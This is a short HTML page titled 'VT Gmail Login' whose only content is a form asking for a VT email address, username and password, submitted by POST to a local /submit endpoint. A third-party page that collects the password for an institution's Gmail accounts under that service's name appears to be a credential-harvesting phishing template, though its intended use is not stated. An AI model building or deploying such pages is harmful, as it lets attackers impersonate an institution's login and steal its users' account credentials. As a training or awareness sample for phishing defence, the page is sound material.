<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VT Gmail Login</title>
</head>
<body>
    <h1>Submit Your VT Gmail Credentials</h1>
    <form action="/submit" method="post">
        <label for="vt_email">VT Email:</label><br>
        <input type="email" id="vt_email" name="vt_email" required><br><br>
        
        <label for="vt_username">VT Username:</label><br>
        <input type="text" id="vt_username" name="vt_username" required><br><br>
        
        <label for="vt_password">VT Password:</label><br>
        <input type="password" id="vt_password" name="vt_password" required><br><br>
        
        <button type="submit">Submit</button>
    </form>
</body>
</html>
